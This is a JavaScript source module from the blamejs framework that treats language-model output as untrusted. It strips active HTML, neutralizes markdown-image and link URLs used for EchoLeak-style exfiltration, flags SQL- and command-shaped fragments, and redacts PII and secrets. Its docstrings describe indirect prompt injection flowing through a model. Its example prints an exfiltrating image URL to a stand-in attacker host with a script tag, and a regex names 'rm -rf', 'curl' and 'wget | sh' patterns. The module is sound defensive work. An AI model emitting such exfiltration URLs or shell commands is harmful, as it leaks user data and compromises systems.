// SPDX-License-Identifier: Apache-2.0
// Copyright (c) blamejs contributors
"use strict";
/**
 * @module b.ai.output
 * @nav    AI
 * @title  AI Output Handling
 *
 * @intro
 *   Treats LLM output as untrusted, attacker-influenceable data before
 *   it reaches a browser, a downstream fetcher, a SQL / command sink, or
 *   a log. The input gate (b.ai.input.classify) defends the prompt going
 *   in; this defends the model's response coming out. OWASP LLM05:2025
 *   (Improper Output Handling) and LLM02:2025 (Sensitive Information
 *   Disclosure). Under RAG / tool / agentic contexts indirect prompt
 *   injection (OWASP LLM01:2025) routes attacker text from a retrieved
 *   document or web page THROUGH the model and out into the response, so
 *   a "trusted" model is still an attacker-controlled channel — output
 *   handling is defense in depth that never assumes the input gate
 *   caught everything.
 *
 *   `sanitize(text, opts)` neutralizes active markup via b.guardHtml,
 *   gates every markdown image / link and HTML src / href URL through
 *   b.safeUrl + b.ssrfGuard (the EchoLeak markdown-image exfiltration
 *   class, CVE-2025-32711), and FLAGS SQL- / command-shaped fragments
 *   rather than silently repairing them. `redact(text, opts)` strips PII
 *   and secret disclosures via b.redact's detector chain plus an
 *   entity-selectable pass. Both treat the model response as hostile by
 *   default; sanitize is best-effort per the guard-family KIND
 *   discipline (refuse / flag over repair for executable sinks).
 *
 * @card
 *   LLM output handling — neutralizes XSS / DOM injection, gates markdown-image and link URLs against SSRF / EchoLeak exfiltration, flags SQL- / command-shaped fragments, and redacts PII / secret disclosures before model output is rendered, fetched, or logged. OWASP LLM05:2025 + LLM02:2025.
 */

var net = require("node:net");

var C = require("./constants");
var codepointClass = require("./codepoint-class");
var numericBounds = require("./numeric-bounds");
var audit = require("./audit");
var guardHtml = require("./guard-html");
var safeUrl = require("./safe-url");
var ssrfGuard = require("./ssrf-guard");
var redact = require("./redact");
var safeSql = require("./safe-sql");
var { AiOutputError } = require("./framework-error");

var SAMPLE_TRUNC = 80;
var DEFAULT_MAX_BYTES = C.BYTES.kib(64);

var NEUTRALIZED_URL = "about:blank#blocked";

var MD_ALT_MAX = 2048;
var MD_GAP_MAX = 256;

function _isMdSpace(ch) {
  return codepointClass.inRanges(ch.charCodeAt(0), codepointClass.WHITESPACE_RANGES);
}

function _makeNextClose(text) {
  var at = text.indexOf("]");
  return function (pos) {
    while (at !== -1 && at < pos) at = text.indexOf("]", at + 1);
    return at;
  };
}

function _findBracketUrls(text, wantBang, emit) {
  var len = text.length;
  var i = 0;
  var nextClose = null;
  while (i < len) {
    var open = text.indexOf("[", i);
    if (open === -1) return;
    var hasBang = open > 0 && text.charAt(open - 1) === "!";
    if (wantBang ? !hasBang : hasBang) { i = open + 1; continue; }
    if (nextClose === null) nextClose = _makeNextClose(text);
    var close = nextClose(open + 1);
    if (close === -1) return;
    if (close - (open + 1) > MD_ALT_MAX) { i = open + 1; continue; }
    if (text.charAt(close + 1) !== "(") { i = open + 1; continue; }
    var k = close + 2;
    var gapEnd = Math.min(len, k + MD_GAP_MAX);
    while (k < gapEnd && _isMdSpace(text.charAt(k))) k += 1;
    var u = k;
    while (u < len && text.charAt(u) !== ")" && !_isMdSpace(text.charAt(u))) u += 1;
    if (u === k) { i = open + 1; continue; }
    emit(text.slice(k, u), k);
    i = u;
  }
}

function _isLineTerminator(code) {
  return code === 0x0A || code === 0x0D || code === 0x2028 || code === 0x2029;
}

function _findRefUrls(text, emit) {
  var len = text.length;
  var lineStart = 0;
  var consumedTo = 0;
  var nextClose = null;
  for (;;) {
    var nl = -1;
    for (var scan = lineStart; scan < len; scan += 1) {
      if (_isLineTerminator(text.charCodeAt(scan))) { nl = scan; break; }
    }
    var lineEnd = nl === -1 ? len : nl;
    if (lineStart >= consumedTo) {
      var p = lineStart;
      var indent = 0;
      while (p < lineEnd && indent < 3 &&
             (text.charAt(p) === " " || text.charAt(p) === "\t")) { p += 1; indent += 1; }
      if (text.charAt(p) === "[") {
        if (nextClose === null) nextClose = _makeNextClose(text);
        var close = nextClose(p + 1);
        if (close > p + 1 && text.charAt(close + 1) === ":") {
          var k = close + 2;
          while (k < len && _isMdSpace(text.charAt(k))) k += 1;
          var u = k;
          while (u < len && !_isMdSpace(text.charAt(u))) u += 1;
          if (u > k) { emit(text.slice(k, u), k); consumedTo = u; }
        }
      }
    }
    if (nl === -1) return;
    lineStart = (text.charCodeAt(nl) === 0x0D && text.charCodeAt(nl + 1) === 0x0A)
      ? nl + 2
      : nl + 1;
  }
}
var HTML_URL_ATTR_RE = /\b(?:src|href)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^"'>\s]+))/dgi;

var SQL_SHAPE_RE = /\b([A-Za-z]+)\b[\s\S]{0,40}\b(?:from|into|table|where|set|values|database|schema|--|;)\b/i;
var CMD_SHAPE_RE = /(?:\$\(|`|\|\s*(?:sh|bash|zsh|cmd|powershell)\b|;\s*rm\s+-rf?\b|&&\s*curl\b|\bwget\b[\s\S]{0,40}\|\s*(?:sh|bash)\b)/i;

function _isSqlReservedWord(word) {
  try {
    safeSql.validateIdentifier(word);
    return false;
  } catch (_e) {
    return true;
  }
}

function _detectSqlShape(text) {
  var m = SQL_SHAPE_RE.exec(text);
  if (!m) return null;
  return _isSqlReservedWord(m[1]) ? m[0] : null;
}

var ENTITY_PATTERNS = Object.freeze({
  "pan":   ["pan"],
  "ssn":   ["ssn"],
  "ein":   ["ein"],
  "iban":  ["iban"],
  "jwt":   ["jwt"],
  "aws":   ["aws-access-key"],
  "phi":   ["phi-shape"],
  "email": [],
  "phone": [],
});

var EMAIL_RE = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}\b/g;
var PHONE_RE = /(?:\+?\d{1,3}[\s.-]?)?(?:\(\d{2,4}\)[\s.-]?)?\d{3}[\s.-]?\d{3,4}\b/g;

function _featuresOf(text) {
  return {
    length: text.length,
    lines:  text.split("\n").length,
  };
}

function _rewriteUrls(text, scan, onUrl) {
  var out = "";
  var last = 0;
  scan(text, function (url, start) {
    if (!url) return;
    var replacement = onUrl(url);
    if (replacement === null || replacement === url) return;
    if (start < last) return;
    out += text.slice(last, start) + replacement;
    last = start + url.length;
  });
  return last === 0 ? text : out + text.slice(last);
}

function _findAttrUrls(text, emit) {
  HTML_URL_ATTR_RE.lastIndex = 0;
  var m;
  while ((m = HTML_URL_ATTR_RE.exec(text)) !== null) {
    var g = m[1] !== undefined ? 1 : (m[2] !== undefined ? 2 : (m[3] !== undefined ? 3 : 0));
    if (g && m[g]) {
      var span = m.indices && m.indices[g];
      emit(m[g], span ? span[0] : m.index + m[0].lastIndexOf(m[g]));
    }
    if (HTML_URL_ATTR_RE.lastIndex === m.index) HTML_URL_ATTR_RE.lastIndex += 1;
  }
}

function _urlVerdict(url) {
  var parsed;
  try {
    parsed = safeUrl.parse(url, { allowedProtocols: safeUrl.ALLOW_HTTP_TLS });
  } catch (_e) {
    return { keep: false, reason: "scheme-or-credential-refused" };
  }
  var host = (parsed.hostname || "").replace(/^\[|\]$/g, "");
  if (host && net.isIP(host)) {
    var cls = ssrfGuard.classify(host);
    if (cls !== null) {
      return { keep: false, reason: "ssrf-" + cls };
    }
  }
  return { keep: true, reason: null };
}

/**
 * @primitive b.ai.output.sanitize
 * @signature b.ai.output.sanitize(text, opts?)
 * @since     0.14.11
 * @status    stable
 * @compliance gdpr, soc2
 * @related   b.ai.output.redact, b.ai.input.classify, b.guardHtml.sanitize, b.ssrfGuard.classify, b.safeUrl.parse
 *
 * Treat an LLM response as untrusted output and neutralize the four
 * sink-injection classes before it is rendered, fetched, or executed.
 * Active markup (script / event-handlers / dangerous URL schemes) is
 * stripped via `b.guardHtml.sanitize`; every markdown image / link and
 * HTML `src` / `href` URL is gated through `b.safeUrl.parse` (scheme +
 * credential) and `b.ssrfGuard.classify` (IP-range), so auto-fetch URLs
 * to attacker or internal / cloud-metadata hosts are neutralized — the
 * EchoLeak zero-click markdown-image exfiltration class
 * ([CVE-2025-32711](https://nvd.nist.gov/vuln/detail/CVE-2025-32711),
 * CVSS 9.3). SQL- and command-shaped fragments are FLAGGED, never
 * repaired (a sanitized-but-executed query is a false sense of safety —
 * sanitize is best-effort per the guard-family discipline). Returns
 * `{ text, verdict, signals, features }` where `text` is the sanitized
 * output, `verdict` is `clean` / `sanitized` / `flagged`, and `signals`
 * lists each neutralization or flag. OWASP LLM05:2025.
 *
 * @opts
 *   maxBytes:     number,       // default 64 KiB; throws on overflow
 *   htmlProfile:  string,       // b.guardHtml profile; default "strict"
 *   sqlShape:     boolean,      // flag SQL-shaped fragments; default true
 *   commandShape: boolean,      // flag command-shaped fragments; default true
 *   audit:        boolean,      // default true; emit aioutput.sanitize on non-clean
 *   errorClass:   ErrorClass,   // override the thrown class on bad input
 *
 * @example
 *   var out = b.ai.output.sanitize(
 *     "Here you go ![x](https://attacker.tld/?s=SECRET) <script>steal()</script>");
 *   out.verdict;                                   // → "sanitized"
 *   out.text.indexOf("<script>");                  // → -1
 *   out.signals.some(function (s) { return s.id === "url-neutralized"; }); // → true
 */
function sanitize(text, opts) {
  opts = opts || {};
  var errorClass = opts.errorClass || AiOutputError;
  numericBounds.requirePositiveFiniteIntIfPresent(opts.maxBytes, "aiOutput.sanitize: opts.maxBytes", errorClass, "ai-output/bad-max-bytes");
  var maxBytes = opts.maxBytes || DEFAULT_MAX_BYTES;
  var auditOn = opts.audit !== false;
  var htmlProfile = typeof opts.htmlProfile === "string" ? opts.htmlProfile : "strict";
  var sqlShape = opts.sqlShape !== false;
  var commandShape = opts.commandShape !== false;

  if (typeof text !== "string") {
    throw errorClass.factory("ai-output/bad-input",
      "aiOutput.sanitize: text must be a string");
  }
  var byteLen = Buffer.byteLength(text, "utf8");
  if (byteLen > maxBytes) {
    throw errorClass.factory("ai-output/output-too-large",
      "aiOutput.sanitize: output exceeds " + maxBytes + " bytes (got " + byteLen + ")");
  }

  var signals = [];
  var out = text;

  function _gateUrl(url) {
    var v = _urlVerdict(url);
    if (v.keep) return null;
    signals.push({ id: "url-neutralized", severity: 3, sample: url.slice(0, SAMPLE_TRUNC), reason: v.reason });
    return NEUTRALIZED_URL;
  }
  out = _rewriteUrls(out, function (t, emit) { _findBracketUrls(t, true, emit); }, _gateUrl);
  out = _rewriteUrls(out, function (t, emit) { _findBracketUrls(t, false, emit); }, _gateUrl);
  out = _rewriteUrls(out, _findRefUrls, _gateUrl);
  out = _rewriteUrls(out, _findAttrUrls, _gateUrl);

  var afterHtml = guardHtml.sanitize(out, { profile: htmlProfile });
  if (afterHtml !== out) {
    signals.push({ id: "html-neutralized", severity: 3, sample: null });
  }
  out = afterHtml;

  if (sqlShape) {
    var sqlMatch = _detectSqlShape(out);
    if (sqlMatch) {
      signals.push({ id: "sql-shape-flagged", severity: 2, sample: sqlMatch.slice(0, SAMPLE_TRUNC) });
    }
  }
  if (commandShape && CMD_SHAPE_RE.test(out)) {   // allow:regex-no-length-cap — `out` is byte-bounded to maxBytes (64 KiB default) at function entry; this is a flag-only signal, not a format validator
    var cm = out.match(CMD_SHAPE_RE);
    signals.push({ id: "command-shape-flagged", severity: 2, sample: cm ? cm[0].slice(0, SAMPLE_TRUNC) : null });
  }

  var sev3 = 0;
  for (var i = 0; i < signals.length; i += 1) {
    if (signals[i].severity === 3) sev3 += 1;
  }
  var verdict = sev3 > 0 ? "sanitized" : (signals.length > 0 ? "flagged" : "clean");

  if (auditOn && verdict !== "clean") {
    audit.safeEmit({
      action:   "aioutput.sanitize",
      outcome:  "success",
      metadata: {
        verdict:   verdict,
        signalIds: signals.map(function (s) { return s.id; }),
        length:    out.length,
      },
    });
  }

  return {
    text:     out,
    verdict:  verdict,
    signals:  signals,
    features: _featuresOf(out),
  };
}

/**
 * @primitive b.ai.output.redact
 * @signature b.ai.output.redact(text, opts?)
 * @since     0.14.11
 * @status    stable
 * @compliance gdpr, soc2, hipaa, pci-dss
 * @related   b.ai.output.sanitize, b.redact.redact, b.redact.classifyDefaults
 *
 * Strip PII and secret disclosures from an LLM response before it is
 * logged, returned, or rendered — the model regurgitates training-data
 * PII, echoes secrets pulled into context, or leaks other-tenant /
 * system-prompt content (OWASP LLM02:2025 Sensitive Information
 * Disclosure; NIST AI 600-1 Data Privacy + Information Security). The
 * always-on secret pass composes `b.redact.redact` — Luhn-validated
 * PAN, JWS triplets, PEM / OpenSSH private keys, AWS key prefixes,
 * vault-sealed ciphertext, connection-string credentials. The
 * entity-selectable PII pass (`opts.entities`) maps onto
 * `b.redact.CLASSIFIER_PATTERNS` for `pan` / `ssn` / `ein` / `iban` /
 * `jwt` / `aws` / `phi`, plus in-string `email` / `phone` shape rules,
 * all substituting the framework marker. Returns
 * `{ text, redacted, hits }` where `text` is the scrubbed output,
 * `redacted` is whether anything changed, and `hits` lists each entity
 * class that fired. Never mutates the input.
 *
 * @opts
 *   entities:    string[],     // subset of: pan, ssn, ein, iban, jwt, aws, phi, email, phone
 *   secrets:     boolean,      // run the always-on b.redact secret pass; default true
 *   marker:      string,       // replacement marker; default b.redact.MARKER
 *   maxBytes:    number,       // default 64 KiB; throws on overflow
 *   audit:       boolean,      // default true; emit aioutput.redact when hits fire
 *   errorClass:  ErrorClass,   // override the thrown class on bad input
 *
 * @example
 *   var out = b.ai.output.redact(
 *     "Contact alice@corp.example or card 4111 1111 1111 1111",
 *     { entities: ["email", "pan"] });
 *   out.redacted;   // → true
 *   out.hits;       // → ["email", "pan"]
 *   out.text;       // → "Contact [REDACTED] or card [REDACTED]"
 */
function redactOutput(text, opts) {
  opts = opts || {};
  var errorClass = opts.errorClass || AiOutputError;
  numericBounds.requirePositiveFiniteIntIfPresent(opts.maxBytes, "aiOutput.redact: opts.maxBytes", errorClass, "ai-output/bad-max-bytes");
  var maxBytes = opts.maxBytes || DEFAULT_MAX_BYTES;
  var auditOn = opts.audit !== false;
  var marker = typeof opts.marker === "string" && opts.marker.length > 0 ? opts.marker : redact.MARKER;
  var runSecrets = opts.secrets !== false;

  if (typeof text !== "string") {
    throw errorClass.factory("ai-output/bad-input",
      "aiOutput.redact: text must be a string");
  }
  var byteLen = Buffer.byteLength(text, "utf8");
  if (byteLen > maxBytes) {
    throw errorClass.factory("ai-output/output-too-large",
      "aiOutput.redact: output exceeds " + maxBytes + " bytes (got " + byteLen + ")");
  }

  var entities = Array.isArray(opts.entities) ? opts.entities : [];
  for (var e = 0; e < entities.length; e += 1) {
    if (typeof entities[e] !== "string" || !Object.prototype.hasOwnProperty.call(ENTITY_PATTERNS, entities[e])) {
      throw errorClass.factory("ai-output/unknown-entity",
        "aiOutput.redact: unknown entity '" + entities[e] +
        "'. Known: " + Object.keys(ENTITY_PATTERNS).join(", "));
    }
  }

  var hits = [];
  var out = text;

  if (runSecrets) {
    var scrubbed = redact.redact(out, { marker: marker });
    if (scrubbed !== out) hits.push("secrets");
    out = typeof scrubbed === "string" ? scrubbed : out;
  }

  for (var i = 0; i < entities.length; i += 1) {
    var ent = entities[i];
    var fired = false;
    var patternNames = ENTITY_PATTERNS[ent];
    for (var p = 0; p < patternNames.length; p += 1) {
      var spec = redact.CLASSIFIER_PATTERNS[patternNames[p]];
      if (spec && spec.detect(out)) {
        out = _scrubEntity(out, patternNames[p], marker);
        fired = true;
      }
    }
    if (ent === "email") {
      if (EMAIL_RE.test(out)) { out = out.replace(EMAIL_RE, marker); fired = true; }   // allow:regex-no-length-cap — `out` byte-bounded to maxBytes at entry; in-string scrub, not a format validator
    } else if (ent === "phone") {
      if (PHONE_RE.test(out)) { out = out.replace(PHONE_RE, marker); fired = true; }   // allow:regex-no-length-cap — `out` byte-bounded to maxBytes at entry; in-string scrub, not a format validator
    }
    if (fired) hits.push(ent);
  }

  if (auditOn && hits.length > 0) {
    audit.safeEmit({
      action:   "aioutput.redact",
      outcome:  "success",
      metadata: { hits: hits, length: out.length },
    });
  }

  return {
    text:     out,
    redacted: hits.length > 0,
    hits:     hits,
  };
}

function _scrubEntity(str, patternName, marker) {
  switch (patternName) {
    case "pan":
    case "iban":
      return str.replace(/\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{1,7}\b/g, marker)
                .replace(/\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b/g, marker);
    case "ssn":
      return str.replace(/\b\d{3}-\d{2}-\d{4}\b/g, marker);
    case "ein":
      return str.replace(/\b\d{2}-\d{7}\b/g, marker);
    case "jwt":
      return str.replace(/\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b/g, marker);
    case "aws-access-key":
      return str.replace(/\b(?:AKIA|ASIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASCA)[A-Z0-9]{16}\b/g, marker);
    case "phi-shape":
      return str.replace(/\b\d{3}-\d{2}-\d{4}\b/g, marker)
                .replace(/\bMRN[:#]?\s*\d{4,12}\b/gi, marker);
    default:
      return str;
  }
}

module.exports = {
  sanitize:    sanitize,
  redact:      redactOutput,
  ENTITIES:    Object.freeze(Object.keys(ENTITY_PATTERNS)),
  AiOutputError: AiOutputError,
};
